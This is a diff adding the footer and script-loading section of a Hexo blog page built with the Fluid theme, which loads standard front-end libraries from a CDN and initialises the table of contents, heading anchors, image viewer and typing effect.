+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/typing-effect.js"></script>
+<script src="/js/particle.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
